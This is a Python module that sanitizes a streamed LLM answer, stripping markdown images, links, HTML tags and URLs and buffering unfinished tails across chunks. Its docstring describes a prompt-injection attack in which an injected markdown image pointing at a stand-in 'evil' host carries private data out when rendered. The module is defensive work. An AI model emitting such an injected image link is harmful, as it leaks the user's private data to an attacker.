"""Strip links, images, URLs and HTML from a streamed LLM answer.

Used where the prompt mixes private data with untrusted web text: a prompt-injected
`![x](https://evil/?d=...)` would otherwise make the browser send that data out when the
markdown renders. Works across chunk boundaries by holding back a possibly-unfinished tail.
"""

import re

_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_LINK = re.compile(r"\[([^\]]*)\]\([^)]*\)")
_TAG = re.compile(r"<[^>\n]*>")
_URL = re.compile(r"(?:https?://|www\.)\S+", re.IGNORECASE)
# A stray "[" or "<" must not hold the whole answer back.
MAX_HOLD = 400


def sanitize(text: str) -> str:
    text = _IMAGE.sub("", text)
    text = _LINK.sub(r"\1", text)
    text = _TAG.sub("", text)
    return _URL.sub("", text)


class AnswerSanitizer:
    def __init__(self) -> None:
        self._buffer = ""

    def feed(self, chunk: str) -> str:
        """Sanitized text that is safe to emit now; the rest waits for more input."""
        self._buffer += chunk
        cut = self._safe_cut(self._buffer)
        ready, self._buffer = self._buffer[:cut], self._buffer[cut:]
        return sanitize(ready)

    def flush(self) -> str:
        rest, self._buffer = self._buffer, ""
        return sanitize(rest)

    @staticmethod
    def _safe_cut(text: str) -> int:
        cut = len(text)
        # Unclosed "[...](...)" (maybe "![") or "<...>" could still become a link/image/tag.
        bracket = text.rfind("[")
        if bracket != -1 and ")" not in text[bracket:]:
            cut = min(cut, bracket - 1 if bracket > 0 and text[bracket - 1] == "!" else bracket)
        angle = text.rfind("<")
        if angle != -1 and ">" not in text[angle:]:
            cut = min(cut, angle)
        # The last word may be the start of a URL.
        if text and not text[-1].isspace():
            cut = min(cut, max(text.rfind(" "), text.rfind("\n")) + 1)
        if len(text) - cut > MAX_HOLD:
            cut = len(text) - MAX_HOLD
        return cut
